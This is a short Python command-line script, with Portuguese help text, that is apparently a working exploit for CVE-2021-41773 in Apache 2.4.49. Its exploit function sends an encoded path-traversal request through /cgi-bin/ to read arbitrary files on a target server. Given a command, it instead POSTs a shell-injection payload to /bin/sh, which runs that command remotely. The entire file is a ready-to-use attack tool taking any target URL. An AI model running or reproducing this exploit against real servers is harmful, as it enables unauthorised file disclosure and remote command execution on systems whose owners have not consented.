import argparse
import urllib.request
import urllib.parse

def exploit(url, file, cmd):
    payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e'
    payload2 = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'

    try:
        if cmd is None:
            response = urllib.request.urlopen(url + payload + file)
            if response.status == 200:
                return response.read().decode('utf-8')
        else:
            data = f"foo=|echo;{cmd}"
            urlPayload = url + payload2
            req = urllib.request.Request(urlPayload, data=data.encode(), method='POST')
            response = urllib.request.urlopen(req)
            if response.status == 200:
                return response.read().decode('utf-8')

    except urllib.error.URLError as e:
        print(f"Erro ao fazer a solicitação para {url} -> {e.reason}")

def main():
    parser = argparse.ArgumentParser(description="CVE-2021-41773 | Apache2 2.4.49 Exploit")
    parser.add_argument("-t", "--target", help="Digite a URL do domínio que deseja testar.", required=True)
    parser.add_argument("-c", "--command", help="Digite o comando que deseja executar.")
    parser.add_argument("-f", "--file", help="Digite o arquivo que gostaria de ler.")

    args = parser.parse_args()

    try:
        print(exploit(args.target, args.file, args.command))
    except KeyboardInterrupt:
        exit(1)
    except EOFError:
        exit(1)

if __name__ == "__main__":
    main()